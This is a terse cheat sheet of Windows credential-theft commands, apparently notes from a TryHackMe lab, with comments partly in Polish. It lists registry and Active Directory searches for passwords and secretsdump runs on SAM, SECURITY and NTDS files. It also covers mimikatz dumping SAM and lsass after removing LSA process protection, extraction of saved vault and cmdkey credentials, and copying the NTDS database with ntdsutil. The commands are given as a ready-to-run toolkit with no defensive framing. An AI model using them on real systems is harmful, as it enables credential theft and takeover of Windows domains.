C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description

python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL

# mimikatz as admin
privilege::debug
token::elevate
lsadump::sam

# lsass dump task mgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL > 0
#lub
!+
!processprotect /process:lsass.exe /remove
# następnnie
sekurlsa::logonpasswords

#saved cred
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials

cmdkey /list
runas /savecred /user:THM.red\thm-local cmd.exe

privilege::debug
sekurlsa::credman

#ntds
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local

